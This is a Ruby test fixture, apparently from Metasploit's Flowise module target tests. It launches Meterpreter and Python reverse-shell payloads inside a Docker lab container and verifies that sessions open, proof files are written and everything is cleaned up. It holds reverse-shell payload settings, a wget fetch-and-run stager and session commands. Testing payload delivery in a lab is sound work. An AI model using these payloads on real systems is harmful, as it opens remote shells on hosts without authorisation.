# frozen_string_literal: true

require 'base64'
require 'digest'
require 'English'
require 'json'
require 'timeout'
require_relative '../../../tools/dev/run_module_target_tests'

# Native delivery calibration before any Flowise owner or its recorder runs.
# The ordinary handler generates its payload; this fixture only reads its
# already encoded command and launches those exact bytes in the real app.
module FlowiseNativeSessionCalibration
  PAYLOAD = 'cmd/linux/http/x64/meterpreter_reverse_tcp'
  CALLBACK_PORT = 4455
  FETCH_PORT = 8095
  REMOTE_COMMAND = '/tmp/module-target-flowise-calibration-command'
  REMOTE_PROOF = '/tmp/module-target-flowise-calibration-proof'
  FETCH_NAME = 'module-target-flowise-calibration-fetch'
  PYTHON_PAYLOAD = 'cmd/unix/reverse_python'
  PYTHON_CALLBACK_PORT = 4456

  # Reuse the existing process-group/timeout executor without running its CLI.
  class CommandRunner < ModuleTargetTests
    def capture(argv, path:)
      output = +''
      passed = command(argv, path: path, timeout: 40, capture: output, quiet: true)
      { passed: passed, output: output }
    end
  end

  def self.settings(host)
    {
      'PAYLOAD' => PAYLOAD, 'LHOST' => host, 'LPORT' => CALLBACK_PORT,
      'FETCH_COMMAND' => 'WGET', 'FETCH_SRVHOST' => host, 'FETCH_SRVPORT' => FETCH_PORT,
      'FETCH_DELETE' => true, 'FETCH_WRITABLE_DIR' => '/tmp',
      'FETCH_FILENAME' => FETCH_NAME, 'FETCH_URIPATH' => FETCH_NAME,
      'DisablePayloadHandler' => false, 'ExitOnSession' => false,
      'ListenerTimeout' => 60, 'VERBOSE' => true
    }
  end

  def self.python_settings(host)
    {
      'PAYLOAD' => PYTHON_PAYLOAD, 'LHOST' => host, 'LPORT' => PYTHON_CALLBACK_PORT,
      'PythonPath' => '/usr/bin/python3', 'SHELL' => '/bin/sh',
      'DisablePayloadHandler' => false, 'ExitOnSession' => false,
      'ListenerTimeout' => 60, 'VERBOSE' => true
    }
  end

  def self.cached_command(job, expected_payload = PAYLOAD)
    raise ArgumentError, 'Unsupported native calibration payload' unless [PAYLOAD, PYTHON_PAYLOAD].include?(expected_payload)

    handler, payload = job.ctx
    raise ArgumentError, 'Unexpected native handler context' unless handler.fullname == 'exploit/multi/handler' && payload.refname == expected_payload && handler.payload_instance.equal?(payload)

    # ExploitDriver#run generated this EncodedPayload before creating the job.
    # This attr_reader must never be replaced by payload.generate/encoded.
    command = handler.payload.encoded
    raise ArgumentError, 'Missing generated native command' unless command.is_a?(String) && !command.empty?

    options = expected_payload == PYTHON_PAYLOAD ? python_settings(payload.datastore['LHOST']) : settings(payload.datastore['LHOST'])
    {
      'payload' => payload.refname, 'command_base64' => Base64.strict_encode64(command),
      'command_sha256' => Digest::SHA256.hexdigest(command),
      'settings' => options.keys.to_h { |key| [key, payload.datastore[key]] }
    }
  end

  def calibrate_native_flowise_fetch
    native_flowise_calibrate(PAYLOAD) { native_flowise_fetch_run }
  end

  def calibrate_native_flowise_python
    native_flowise_calibrate(PYTHON_PAYLOAD) { native_flowise_python_run }
  end

  private

  def native_flowise_calibrate(payload)
    @native_calibration = { profile: @profile, payload: payload, phase: 'starting', module_verdict: nil }
    @native_calibration_state = nil
    @native_calibration_session = nil
    @native_calibration_job = nil
    Timeout.timeout(120) do
      @native_calibration_state = native(action: 'state')
      yield
    end
    @native_calibration[:status] = 'passed'
  ensure
    failure = $ERROR_INFO
    begin
      native_flowise_calibration_cleanup
      @native_calibration[:cleanup] = 'passed'
    rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
      @native_calibration[:cleanup] = 'failed'
      @native_calibration[:cleanup_failure] = "#{e.class}: #{e.message}"
      @native_calibration[:status] = 'setup_failed'
      raise unless failure
    ensure
      @native_calibration[:failure] = "#{failure.class}: #{failure.message}" if failure
      @native_calibration[:status] = 'setup_failed' if failure
      @native_calibration[:status] ||= 'setup_failed'
      record('native-payload-calibration.jsonl', @native_calibration)
      File.write(artifact('native-payload-calibration-console.log'), console.all_data)
    end
  end

  def native_flowise_fetch_run
    uid = @native.fetch('uid')
    gid = @native.fetch('sdk').fetch('process_status')[/^Gid:\s+(\d+)/, 1]
    expect(gid).not_to be_nil
    [REMOTE_COMMAND, REMOTE_PROOF, "/tmp/#{FETCH_NAME}"].each do |path|
      native_flowise_exec('app', 'sh', '-c', 'test ! -e "$1" && test ! -L "$1"', 'sh', path)
    end
    expect(console_command('sessions -l')).to include('No active sessions')
    expect(console_command('jobs -l')).to include('No active jobs')
    before_pids = native_flowise_exec('app', 'sh', '-c', 'printf "%s\\n" /proc/[0-9]*').lines.map { |line| File.basename(line.strip) }
    generated = native_flowise_start_handler(FlowiseNativeSessionCalibration.settings(listener_host), PAYLOAD)
    command = Base64.strict_decode64(generated.fetch('command_base64'))
    url = "http://#{listener_host}:#{FETCH_PORT}/#{FETCH_NAME}"
    expect(command).to include('wget ', url, "/tmp/#{FETCH_NAME}")
    delay = command[/sleep (\d+);rm -rf/, 1]
    expect(delay.to_i).to be_between(3, 7)
    @native_calibration.merge!(generated: generated, deletion_delay_seconds: delay.to_i, uri: "/#{FETCH_NAME}", job: @native_calibration_job, phase: 'generated')
    wait_target(15) { expect(native_flowise_listener_rows(CALLBACK_PORT)).not_to be_empty }
    wait_target(15) { expect(native_flowise_http_pool.flat_map { |row| row.fetch('resources') }).to include("/#{FETCH_NAME}") }
    @native_calibration[:installed_command] = native_flowise_install_command(command, generated.fetch('command_sha256'), uid, gid)
    native_flowise_cli(*target_runtime.fetch('compose'), 'exec', '-T', '-d', '--user', "#{uid}:#{gid}", 'app', '/bin/sh', REMOTE_COMMAND)
    @native_calibration[:phase] = 'native_launched'
    wait_target(35) do
      sessions = native_flowise_json('SESSIONS', 'framework.sessions.keys')
      expect(sessions.length).to eq(1)
      @native_calibration_session = sessions.fetch(0).to_i
      expect(console.all_data).to include("Meterpreter session #{@native_calibration_session} opened")
    end
    session = "framework.sessions[#{@native_calibration_session}]"
    expect(native_flowise_json('HOST', "#{session}.session_host")).to eq(target_runtime.fetch('module_endpoints').fetch('app').fetch('host'))
    reply = console_command("sessions -i #{@native_calibration_session} -C getpid")
    pid = reply[/Current pid: (\d+)/, 1]
    expect(pid).not_to be_nil, reply
    expect(before_pids).not_to include(pid)
    status = native_flowise_exec('app', 'cat', "/proc/#{pid}/status")
    expect(status[/^Uid:\s+(\d+)/, 1]).to eq(uid)
    value = 'FlowiseNativeFetchSession'
    write = "handle=#{session}.fs.file.new(#{REMOTE_PROOF.inspect},'wb');begin;puts 'FLOWISE_NATIVE_WRITE='+handle.write(#{value.inspect}).to_s;ensure;handle.close;end"
    expect(console_command("irb -e #{write.inspect}")).to include("FLOWISE_NATIVE_WRITE=#{value.bytesize}")
    expect(native_flowise_exec('app', 'cat', REMOTE_PROOF)).to eq(value)
    expect(native_flowise_exec('app', 'sha256sum', REMOTE_PROOF).split.first).to eq(Digest::SHA256.hexdigest(value))
    expect(native_flowise_exec('app', 'stat', '-c', '%u', REMOTE_PROOF).strip).to eq(uid)
    elf = Base64.strict_decode64(native_flowise_exec('app', 'python3', '-c', 'import base64,sys;print(base64.b64encode(open("/proc/"+sys.argv[1]+"/exe","rb").read()).decode())', pid).strip)
    expect(elf).to start_with("\x7fELF")
    expect(native_flowise_exec('app', 'sha256sum', "/proc/#{pid}/exe").split.first).to eq(Digest::SHA256.hexdigest(elf))
    File.binwrite(artifact('native-payload-executing.elf'), elf)
    ancestry = native_flowise_ancestry(pid, before_pids)
    @native_calibration.merge!(phase: 'used', session: @native_calibration_session, pid: pid, uid: uid, gid: gid, command_mode: '600', process_status: status, ancestry: ancestry, proof_sha256: Digest::SHA256.hexdigest(value), executing_elf_sha256: Digest::SHA256.hexdigest(elf), executing_elf_bytes: elf.bytesize)
    console_command("irb -e #{"#{session}.fs.file.rm(#{REMOTE_PROOF.inspect})".inspect}")
    expect(native_flowise_exec('app', 'test', '!', '-e', REMOTE_PROOF)).to eq('')
    console_command("irb -e #{"#{session}.exit".inspect}")
    ancestry.each do |process|
      wait_target(20) { expect(native_flowise_exec('app', 'sh', '-c', 'if test -e "$1";then printf PRESENT;else printf ABSENT;fi', 'sh', "/proc/#{process.fetch('pid')}")).to eq('ABSENT') }
    end
    wait_target(20) { expect(native_flowise_exec('app', 'sh', '-c', 'if test -e "$1";then printf PRESENT;else printf ABSENT;fi', 'sh', "/tmp/#{FETCH_NAME}")).to eq('ABSENT') }
    wait_target(15) { expect(console_command('sessions -l')).to include('No active sessions') }
    @native_calibration[:phase] = 'remote_exited'
    native_flowise_stop_handler
    expect(console_command('jobs -l')).to include('No active jobs')
    wait_target(15) { expect(native_flowise_listener_rows(CALLBACK_PORT)).to eq([]) }
    pool = native_flowise_http_pool
    expect(pool.flat_map { |row| row.fetch('resources') }).to eq([])
    probe = 'require "net/http";require "json";begin;u=URI(ARGV[0]);r=Net::HTTP.start(u.host,u.port,open_timeout:2,read_timeout:2){|h|h.get(u)};puts JSON.generate(code:r.code.to_i);rescue Errno::ECONNREFUSED;puts JSON.generate(state:"refused");end'
    response = JSON.parse(native_flowise_exec('framework', 'ruby', '-e', probe, url))
    expect(response['state'] == 'refused' || response['code'] == 404).to be(true), response.inspect
    @native_calibration.merge!(phase: 'resources_removed', pool: pool, resource_probe: response)
  end

  def native_flowise_start_handler(options, payload)
    console_command('back')
    console_command('use exploit/multi/handler')
    options.each do |key, value|
      expect(console_command("set #{key} #{value}")).not_to match(/\[-\]|Unknown datastore option|Invalid option/)
    end
    expect(console_command('run -j')).not_to include('[-]')
    jobs = native_flowise_json('JOBS', 'framework.jobs.keys')
    expect(jobs.length).to eq(1)
    @native_calibration_job = jobs.fetch(0).to_s
    snapshot = "FlowiseNativeSessionCalibration.cached_command(framework.jobs.fetch(#{@native_calibration_job.inspect}),#{payload.inspect})"
    console_command('irb -e \'load "test/module_targets/flowise/native_session_calibration.rb"\'')
    generated = native_flowise_json('COMMAND', snapshot)
    expect(generated.fetch('settings')).to eq(options)
    generated
  end

  def native_flowise_ancestry(pid, before_pids)
    script = 'const fs=require("fs"),before=JSON.parse(process.argv[2]);let p=Number(process.argv[1]),rows=[];while(p>1&&!before.includes(String(p))){const text=fs.readFileSync("/proc/"+p+"/status","utf8");rows.push({pid:p,status:text});p=Number(text.match(/^PPid:\s+(\d+)/m)[1]);}console.log(JSON.stringify(rows));'
    ancestry = JSON.parse(native_flowise_exec('app', 'node', '-e', script, pid, JSON.generate(before_pids)))
    expect(ancestry.map { |row| row.fetch('pid').to_s }).to include(pid)
    ancestry
  end

  def native_flowise_python_run
    uid = @native.fetch('uid')
    gid = @native.fetch('sdk').fetch('process_status')[/^Gid:\s+(\d+)/, 1]
    expect(gid).not_to be_nil
    [REMOTE_COMMAND, REMOTE_PROOF].each do |path|
      native_flowise_exec('app', 'sh', '-c', 'test ! -e "$1" && test ! -L "$1"', 'sh', path)
    end
    expect(console_command('sessions -l')).to include('No active sessions')
    expect(console_command('jobs -l')).to include('No active jobs')
    before_pids = native_flowise_exec('app', 'sh', '-c', 'printf "%s\\n" /proc/[0-9]*').lines.map { |line| File.basename(line.strip) }
    generated = native_flowise_start_handler(FlowiseNativeSessionCalibration.python_settings(listener_host), PYTHON_PAYLOAD)
    command = Base64.strict_decode64(generated.fetch('command_base64'))
    expect(command).to include('/usr/bin/python3')
    @native_calibration.merge!(generated: generated, job: @native_calibration_job, phase: 'generated', http_fetch_used: false)
    wait_target(15) { expect(native_flowise_listener_rows(PYTHON_CALLBACK_PORT)).not_to be_empty }
    @native_calibration[:installed_command] = native_flowise_install_command(command, generated.fetch('command_sha256'), uid, gid)
    native_flowise_cli(*target_runtime.fetch('compose'), 'exec', '-T', '-d', '--user', "#{uid}:#{gid}", 'app', '/bin/sh', REMOTE_COMMAND)
    @native_calibration[:phase] = 'native_launched'
    wait_target(35) do
      sessions = native_flowise_json('SESSIONS', 'framework.sessions.keys')
      expect(sessions.length).to eq(1)
      @native_calibration_session = sessions.fetch(0).to_i
      expect(console.all_data).to include("Command shell session #{@native_calibration_session} opened")
    end
    session = "framework.sessions[#{@native_calibration_session}]"
    expect(native_flowise_json('HOST', "#{session}.session_host")).to eq(target_runtime.fetch('module_endpoints').fetch('app').fetch('host'))
    value = 'FlowiseNativePythonSession'
    write = "printf %s #{value}>#{REMOTE_PROOF};printf '\\nFLOWISE_NATIVE_PID=%s\\n' $$"
    reply = console_command("sessions -i #{@native_calibration_session} -c #{write.inspect}")
    pid = reply[/^FLOWISE_NATIVE_PID=(\d+)\r?$/, 1]
    expect(pid).not_to be_nil, reply
    expect(before_pids).not_to include(pid)
    status = native_flowise_exec('app', 'cat', "/proc/#{pid}/status")
    expect(status[/^Uid:\s+(\d+)/, 1]).to eq(uid)
    expect(native_flowise_exec('app', 'cat', REMOTE_PROOF)).to eq(value)
    expect(native_flowise_exec('app', 'sha256sum', REMOTE_PROOF).split.first).to eq(Digest::SHA256.hexdigest(value))
    expect(native_flowise_exec('app', 'stat', '-c', '%u', REMOTE_PROOF).strip).to eq(uid)
    ancestry = native_flowise_ancestry(pid, before_pids)
    @native_calibration.merge!(phase: 'used', session: @native_calibration_session, pid: pid, uid: uid, gid: gid, process_status: status, ancestry: ancestry, exact_bytes_base64: Base64.strict_encode64(value), proof_sha256: Digest::SHA256.hexdigest(value))
    console_command("sessions -i #{@native_calibration_session} -c #{"rm -f #{REMOTE_PROOF}".inspect}")
    expect(native_flowise_exec('app', 'test', '!', '-e', REMOTE_PROOF)).to eq('')
    native_flowise_close_shell(@native_calibration_session, ancestry)
    @native_calibration[:phase] = 'remote_exited'
    native_flowise_stop_handler
    expect(console_command('jobs -l')).to include('No active jobs')
    wait_target(15) { expect(native_flowise_listener_rows(PYTHON_CALLBACK_PORT)).to eq([]) }
    @native_calibration.merge!(phase: 'resources_removed', native_listener_absent: true)
  end

  def native_flowise_close_shell(session_id, ancestry)
    console_command("irb -e #{"framework.sessions[#{session_id}].shell_write(\"exit\\n\")".inspect}")
    ancestry.each do |process|
      wait_target(20) { expect(native_flowise_exec('app', 'sh', '-c', 'if test -e "$1";then printf PRESENT;else printf ABSENT;fi', 'sh', "/proc/#{process.fetch('pid')}")).to eq('ABSENT') }
    end
    # Closing the host socket cannot substitute for the preceding remote proof.
    console_command("irb -e #{"framework.sessions[#{session_id}]&.shell_close".inspect}")
    wait_target(15) { expect(console_command('sessions -l')).to include('No active sessions') }
  end

  def native_flowise_json(label, expression)
    code = "puts 'FLOWISE_NATIVE_#{label}='+JSON.generate(#{expression})"
    output = console_command("irb -e #{code.inspect}")
    value = output[/^FLOWISE_NATIVE_#{Regexp.escape(label)}=(.*)\r?$/, 1]
    expect(value).not_to be_nil, output
    JSON.parse(value)
  end

  def native_flowise_cli(*argv)
    @native_flowise_commands ||= CommandRunner.new
    result = @native_flowise_commands.capture(argv, path: artifact('native-payload-cli.log'))
    record('native-payload-cli.jsonl', argv: argv, passed: result.fetch(:passed), output: result.fetch(:output))
    expect(result.fetch(:passed)).to be(true), result.fetch(:output)
    result.fetch(:output)
  end

  def native_flowise_exec(service, *)
    native_flowise_cli(*target_runtime.fetch('compose'), 'exec', '-T', service, *)
  end

  def native_flowise_install_command(command, sha256, uid, gid)
    # Check both regular names and dangling symlinks immediately before cp.
    native_flowise_exec('app', 'sh', '-c', 'test ! -e "$1" && test ! -L "$1"', 'sh', REMOTE_COMMAND)
    local = artifact('native-payload-command.raw')
    File.open(local, File::WRONLY | File::CREAT | File::EXCL, 0o600) { |file| file.write(command) }
    native_flowise_cli(*target_runtime.fetch('compose'), 'cp', local, "app:#{REMOTE_COMMAND}")
    copied_owner_mode = native_flowise_exec('app', 'stat', '-c', '%u:%g:%a', REMOTE_COMMAND).strip
    copied_sha256 = native_flowise_exec('app', 'sha256sum', REMOTE_COMMAND).split.first
    record('native-payload-command-installation.jsonl', phase: 'copied', path: REMOTE_COMMAND, owner_mode: copied_owner_mode, sha256: copied_sha256)
    expect(copied_sha256).to eq(sha256)
    native_flowise_exec('app', 'chown', "#{uid}:#{gid}", REMOTE_COMMAND)
    native_flowise_exec('app', 'chmod', '600', REMOTE_COMMAND)
    owner_mode = native_flowise_exec('app', 'stat', '-c', '%u:%g:%a', REMOTE_COMMAND).strip
    actual_sha256 = native_flowise_exec('app', 'sha256sum', REMOTE_COMMAND).split.first
    record('native-payload-command-installation.jsonl', phase: 'prepared', path: REMOTE_COMMAND, owner_mode: owner_mode, sha256: actual_sha256)
    expect(owner_mode).to eq("#{uid}:#{gid}:600")
    expect(actual_sha256).to eq(sha256)
    { path: REMOTE_COMMAND, copied_owner_mode: copied_owner_mode, copied_sha256: copied_sha256, owner_mode: owner_mode, sha256: actual_sha256 }
  end

  def native_flowise_listener_rows(port)
    code = "require 'json';rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map{|p|File.readlines(p).drop(1).map(&:split)};puts JSON.generate(rows.select{|r|r[3]=='0A'&&r[1].split(':').last.to_i(16)==#{port}})"
    JSON.parse(native_flowise_exec('framework', 'ruby', '-e', code))
  end

  def native_flowise_http_pool
    expression = "(defined?(Rex::Proto::Http::Server) ? Rex::ServiceManager.instance.values.uniq.grep(Rex::Proto::Http::Server) : []).select{|s|s.listen_port==#{FETCH_PORT}}.map{|s|{port:s.listen_port,resources:s.resources.keys,references:s.instance_variable_get(:@_references)}}"
    native_flowise_json('POOL', expression)
  end

  def native_flowise_stop_handler
    return unless @native_calibration_job

    console_command("irb -e #{"framework.jobs.stop_job(#{@native_calibration_job.inspect})".inspect}")
    @native_calibration_job = nil
  end

  def native_flowise_calibration_cleanup
    raise IOError, 'Native calibration console unavailable for cleanup' if @console_broken

    # Fallback host cleanup cannot satisfy the preceding native PID/file gates.
    if @native_calibration_session
      console_command("irb -e #{"framework.sessions[#{@native_calibration_session}]&.kill".inspect}")
    end
    native_flowise_stop_handler
    return unless @native_calibration_state

    restored = native(action: 'restore_state', before: @native_calibration_state)
    expect(restored.fetch('restored')).to eq(@native_calibration_state)
    @native_calibration[:state_restored] = true
  end
end
